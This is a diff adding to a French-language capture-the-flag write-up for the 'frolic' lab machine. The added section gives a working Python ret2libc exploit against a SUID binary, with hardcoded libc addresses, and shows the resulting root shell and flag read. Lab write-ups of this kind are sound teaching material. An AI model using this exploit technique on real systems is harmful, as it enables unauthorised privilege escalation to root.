@@ -563,4 +563,35 @@ Voilà nous avons accès en tant que www-data nous avons un shell.
     /home/ayush/.binary/rop
     [...SNIP...]
 
-Voilà nous avons trouver un fichier SUID donc ça ressemble beaucoup à du ROP (Return-oriented programming), 
+Voilà nous avons trouver un fichier SUID donc ça ressemble beaucoup à du ROP (Return-oriented programming), donc j'ai créer un script pour exploiter cela directement.
+
+Donc voici le script à transférer et à executer sur la machine cible de la victime.
+
+    from struct import pack
+    from subprocess import call
+
+    system = 0xb7e19000 + 0x0003ada0
+    exit = 0xb7e19000 + 0x0002e9d0
+    binsh = 0xb7e19000 + 0x0015ba0b
+
+    def p32(num):
+         return pack("<I",num)
+
+    buf = "A"*52
+    buf += p32(system)
+    buf += p32(exit)
+    buf += p32(binsh)
+
+    call(["/home/ayush/.binary/rop", buf])
+
+Vous pouvez très bien transférer avec netcat ou bien SimpleHTTPServer avec python mais bon personnellement j'ai utilisé python pour le transfert de fichier. Une fois que c'est transférer vous avez juste à exécuter le script et vous êtes root.
+
+    www-data@frolic:/tmp$ python root.py
+    # id
+    uid=0(root) gid=33(www-data) groups=33(www-data)
+    # wc -c /root/root.txt
+    33 /root/root.txt
+    # python -c "import pty;pty.spawn('/bin/bash')"
+    root@frolic:/tmp# wc -c /root/root.txt
+    33 /root/root.txt
+    root@frolic:/tmp#
